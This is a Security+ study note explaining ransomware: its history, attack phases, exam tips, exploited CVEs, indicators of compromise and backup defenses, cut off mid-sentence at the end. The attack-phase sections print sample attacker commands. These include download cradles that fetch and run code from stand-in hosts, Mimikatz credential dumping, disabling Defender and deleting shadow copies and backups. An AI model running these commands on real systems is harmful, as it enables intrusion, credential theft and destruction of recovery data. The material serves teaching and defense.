---
domain: "cybersecurity/attacks"
tags: [ransomware, malware, cryptography, extortion, incident-response, threat-actors]
---
# ransomware

**Ransomware** is a category of [[malware]] that encrypts a victim's files or locks access to a system, then demands payment — typically in [[cryptocurrency]] — in exchange for a decryption key or restoration of access. It represents one of the most financially destructive forms of [[cyberattack]], combining elements of [[cryptography]], [[social engineering]], and [[extortion]] into a weaponized payload. Modern ransomware families often include data exfiltration capabilities, enabling **double-extortion** schemes where attackers threaten to publish stolen data if the ransom is not paid.

---

## Overview

Ransomware emerged in rudimentary form as early as 1989 with the AIDS Trojan, distributed on floppy disks to HIV researchers, which used symmetric encryption to lock filenames and demanded payment by mail. The concept remained niche until the confluence of asymmetric cryptography, anonymous payment systems, and global internet connectivity made it operationally viable at scale. The 2013 emergence of **CryptoLocker**, using RSA-2048 paired with AES to encrypt files and demanding payment in Bitcoin, marked the beginning of the modern ransomware era and demonstrated multi-million-dollar profitability.

The ransomware ecosystem has since evolved into a sophisticated, industrialized criminal supply chain. **Ransomware-as-a-Service (RaaS)** platforms such as REvil, DarkSide, BlackCat (ALPHV), and LockBit operate like software businesses — providing affiliates with pre-built ransomware binaries, negotiation portals, payment infrastructure, and even customer support for victims. Affiliates receive 70–80% of ransom proceeds while the platform operators collect the remainder. This model dramatically lowered the technical barrier to entry, enabling criminals with minimal coding skill to conduct sophisticated attacks.

The financial impact is staggering. The 2021 Colonial Pipeline attack (DarkSide ransomware) resulted in a $4.4 million ransom payment and triggered a national emergency declaration in the United States due to fuel supply disruption. The same year, the Kaseya VSA supply-chain attack by REvil compromised approximately 1,500 businesses simultaneously by targeting managed service provider software. Healthcare, critical infrastructure, education, and government sectors are disproportionately targeted because of their low tolerance for operational downtime and historically weaker security postures.

Modern ransomware operations also employ **triple extortion**, adding a third pressure layer beyond encryption and data theft — for example, conducting [[Distributed Denial of Service (DDoS)]] attacks against victims or contacting the victim's customers, patients, or partners directly to amplify pressure. Some threat actors skip encryption entirely, engaging in **exfiltration-only extortion** (sometimes called "data theft extortion"), recognizing that the threat of exposure alone is sufficient for payment in many cases, particularly in regulated industries subject to breach notification laws like [[HIPAA]] or [[GDPR]].

The geopolitical dimension is significant: nation-state actors, particularly from North Korea (Lazarus Group), Russia, and Iran, have employed ransomware both for financial gain and as a disruptive weapon against adversaries. The interplay between cybercrime and state sponsorship creates a complex attribution and response environment that challenges law enforcement and policy alike.

---

## How It Works

Ransomware attacks follow a recognizable kill chain that mirrors the broader [[MITRE ATT&CK]] framework. Understanding the technical progression at each phase is essential for both defense and forensic response.

### Phase 1: Initial Access

Ransomware enters an environment through several primary vectors:

- **Phishing emails** with malicious attachments (weaponized Office documents using VBA macros, ISO files, LNK files) or links to drive-by download sites.
- **Exploitation of internet-facing services**: RDP (TCP/3389) brute-forcing or credential stuffing is among the most common vectors. Shodan can reveal millions of exposed RDP instances globally.
- **Vulnerability exploitation**: ProxyShell (CVE-2021-34473/34523/31207) against Exchange, Log4Shell (CVE-2021-44228), and similar critical vulnerabilities have all been leveraged as ransomware entry points.
- **Supply chain compromise**: Trojanized software updates or compromised MSP tooling (as in Kaseya) providing immediate access to many downstream victims.
- **Initial Access Brokers (IABs)**: Specialized criminals sell pre-established network access on dark web forums to ransomware affiliates, further separating the attack phases.

### Phase 2: Execution and Persistence

Upon execution, the ransomware dropper or loader:

```powershell
# Common initial execution via mshta (LotL - Living off the Land)
mshta.exe http://malicious[.]domain/payload.hta

# PowerShell download cradle
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://c2[.]bad/stage2.ps1')"

# Disable Windows Defender via PowerShell (common pre-encryption step)
Set-MpPreference -DisableRealtimeMonitoring $true
```

Persistence mechanisms include scheduled tasks, registry run keys (`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`), and WMI subscriptions.

### Phase 3: Discovery and Lateral Movement

Attackers spend hours to weeks performing reconnaissance before deploying encryption. Tools commonly observed include:

```bash
# Network discovery
net view /all
arp -a
nmap -sn 192.168.1.0/24

# Active Directory enumeration (BloodHound/SharpHound)
SharpHound.exe --CollectionMethods All --OutputDirectory C:\Temp\

# Credential harvesting via Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::dcsync /domain:corp.local /user:Administrator
```

Lateral movement leverages [[PsExec]], [[WMI]], [[SMB]] (TCP/445), and compromised RDP sessions. Domain Administrator privileges are prioritized because they enable disabling backups and deploying ransomware domain-wide via Group Policy Objects (GPO).

### Phase 4: Defense Evasion

Before encrypting, ransomware operators systematically destroy recovery options:

```batch
:: Delete Volume Shadow Copies (VSS)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

:: Disable Windows Backup and Recovery
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no

:: Stop backup-related services
net stop "Backup Exec Agent" /y
net stop vss /y
net stop "SQL Server (MSSQLSERVER)" /y
```

### Phase 5: Encryption

Modern ransomware uses a **hybrid encryption scheme** combining asymmetric and symmetric cryptography:

1. **Attacker generates an RSA-2048 or RSA-4096 key pair** offline. The public key is embedded in the malware binary.
2. **On the victim machine**, the ransomware generates a unique **AES-256 key** per file (or per session).
3. Each file is encrypted with AES-256 in CBC or CTR mode.
4. The AES key is then encrypted with the attacker's RSA public key and appended to the encrypted file or stored in a ransom note directory.
5. The plaintext AES key is **deleted from memory** — recovery without the RSA private key (held by the attacker) is computationally infeasible.

```python
# Simplified conceptual illustration of hybrid encryption scheme
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os

# Generate session AES key (per-file or per-run)
aes_key = os.urandom(32)  # 256-bit AES key
iv = os.urandom(16)

# Encrypt file data with AES-256-CBC
cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
encryptor = cipher.encryptor()
ciphertext = encryptor.update(plaintext_data) + encryptor.finalize()

# Encrypt AES key with attacker's embedded RSA public key
encrypted_aes_key = attacker_public_key.encrypt(
    aes_key,
    padding.OAEP(...)
)
# Store encrypted_aes_key with the file — RSA private key required to recover aes_key
```

Target file extensions typically include documents, spreadsheets, databases, images, code repositories, and backup files. Ransomware commonly avoids encrypting system files needed to display the ransom note and maintain OS functionality.

### Phase 6: Extortion and Negotiation

The ransom note (e.g., `README.txt`, `DECRYPT_INSTRUCTIONS.html`) directs victims to a Tor-hosted negotiation portal. Payments are demanded in Monero (XMR) or Bitcoin (BTC). Threat actors often engage in professional negotiation, sometimes offering test decryption of a few files to prove capability.

---

## Key Concepts

- **Double Extortion**: A technique pioneered by the Maze ransomware group (circa 2019) in which attackers both encrypt victim data *and* exfiltrate it before encryption, threatening to publish stolen files on a **leak site** (often Tor-hosted) if the ransom is not paid. This negates the "I'll restore from backup" response.

- **Ransomware-as-a-Service (RaaS)**: A criminal business model where ransomware developers lease their malware, infrastructure, and support to **affiliates** who conduct the actual attacks and share a percentage of ransom revenue. Examples include LockBit 3.0, BlackCat/ALPHV, and Cl0p.

- **Hybrid Encryption**: The combination of fast symmetric encryption (AES-256) to encrypt file contents with slow asymmetric encryption (RSA-2048/4096) to protect the symmetric key. This design makes brute-forcing the key computationally infeasible and ensures only the attacker (holding the RSA private key) can provide decryption.

- **Living off the Land (LotL)**: The technique of using legitimate, pre-installed system tools — such as `PowerShell`, `WMI`, `certutil`, `mshta`, and `PsExec` — to conduct attack phases, making detection harder because malicious activity blends with normal administrative behavior.

- **Volume Shadow Copy (VSS) Deletion**: A near-universal ransomware behavior of deleting Windows Shadow Copies using `vssadmin` or `wmic` commands before encryption begins. VSS deletion eliminates easy local recovery options and is a key behavioral [[Indicator of Compromise (IoC)]].

- **Initial Access Broker (IAB)**: A specialized threat actor who compromises networks and sells that access to other criminals (including ransomware affiliates) rather than monetizing it themselves. IABs operate on dark web forums and marketplaces and represent a critical node in the ransomware supply chain.

- **Dwell Time**: The period between initial compromise and ransomware deployment, during which attackers conduct reconnaissance, move laterally, escalate privileges, and exfiltrate data. Average dwell time has decreased from months to days in recent years as attackers optimize operations, but it remains a critical detection window.

---

## Exam Relevance

**SY0-701 Domain Mapping**: Ransomware appears primarily in **Domain 2.0 – Threats, Vulnerabilities, and Mitigations** (2.4 – Analyze indicators of malicious activity) and **Domain 4.0 – Security Operations** (4.8 – Explain appropriate incident response activities).

**Common Question Patterns**:

- Questions will ask you to identify ransomware as a type of **crypto-malware** — know that the CompTIA exam uses this term interchangeably with ransomware in some contexts.
- Expect scenario questions where you must identify the *first* step in incident response after a ransomware attack — the answer is typically **containment** (isolating affected systems), not eradication or recovery.
- Questions may test knowledge of **backup strategies** as the primary countermeasure — specifically the **3-2-1 backup rule** (3 copies, 2 different media types, 1 offsite).
- Understand the difference between ransomware and **locker ransomware** (locks the screen/OS) versus **crypto ransomware** (encrypts files). Screen lockers are generally less severe and do not actually encrypt files.

**Gotchas**:
- Do not confuse ransomware with **scareware** — scareware only *threatens* consequences without actually encrypting or locking anything; it relies purely on psychological manipulation to extort payment.
- The exam may present a scenario involving VSS deletion — recognize this as a **ransomware precursor behavior** and an IoC, not just an administrative action.
- **Paying the ransom is never the recommended best practice** on the exam. The correct answer will always favor incident response procedures, law enforcement notification, and restoration from backups.
- Know that the [[NIST Incident Response]] lifecycle (Preparation → Detection → Containment → Eradication → Recovery → Post-Incident) applies directly to ransomware scenarios.

---

## Security Implications

### Vulnerabilities and Attack Vectors

Ransomware exploits a wide attack surface, and several high-profile CVEs have been weaponized:

- **CVE-2021-34473 / 34523 / 31207 (ProxyShell)**: Microsoft Exchange Server RCE chain exploited by LockFile, BlackByte, and Hive ransomware groups to gain initial access to on-premises Exchange environments.
- **CVE-2021-44228 (Log4Shell)**: Apache Log4j RCE vulnerability used by ransomware operators for initial access within days of public disclosure, demonstrating the speed of ransomware group response to new vulnerabilities.
- **CVE-2019-19781 (Citrix ADC/Gateway)**: Path traversal and code execution vulnerability heavily exploited for ransomware initial access by REvil and other groups.
- **CVE-2021-20016 (SonicWall SMA)**: SQL injection in SonicWall VPN appliances exploited by HelloKitty ransomware.
- **MS17-010 (EternalBlue / WannaCry)**: The 2017 WannaCry ransomware worm exploited this SMB vulnerability to self-propagate, infecting over 200,000 systems in 150 countries within days, causing an estimated $4–8 billion in damages. This remains a landmark case study in ransomware impact.

### Notable Incidents

| Incident | Year | Group | Impact |
|---|---|---|---|
| WannaCry | 2017 | North Korea (Lazarus) | 200,000+ systems, ~$8B damages, NHS disruption |
| NotPetya | 2017 | Russia (Sandworm) | $10B+ damages, Maersk/Merck/FedEx decimated |
| Colonial Pipeline | 2021 | DarkSide | $4.4M ransom, US fuel supply emergency |
| Kaseya VSA | 2021 | REvil | 1,500 downstream businesses encrypted |
| Change Healthcare | 2024 | ALPHV/BlackCat | $22M ransom, US healthcare billing disrupted for weeks |

### Behavioral Indicators of Compromise (IoCs)

- Sudden spike in file I/O operations across file servers (encryption activity)
- Mass file extension changes (e.g., `.locked`, `.encrypted`, `.zepto`, `.wncry`)
- `vssadmin delete shadows` or `wmic shadowcopy delete` commands in process logs
- Legitimate tools (PsExec, Cobalt Strike, AnyDesk) deployed across multiple hosts in short timeframe
- Large outbound data transfers preceding encryption (exfiltration phase)
- PowerShell execution with encoded commands and network calls
- Ransom note files (`README.txt`, `HOW_TO_DECRYPT.html`) appearing in multiple directories

---

## Defensive Measures

### Technical Controls

**1. Backup Strategy – 3-2-1-1 Rule**
Maintain at least 3 copies of data, on 2 different media types, with 1 offsite, and **1 offline or immutable copy**. Immutable backups (e.g., AWS S3 Object Lock, Veeam immutability, tape air-gap) cannot be deleted by ransomware even if attackers compromise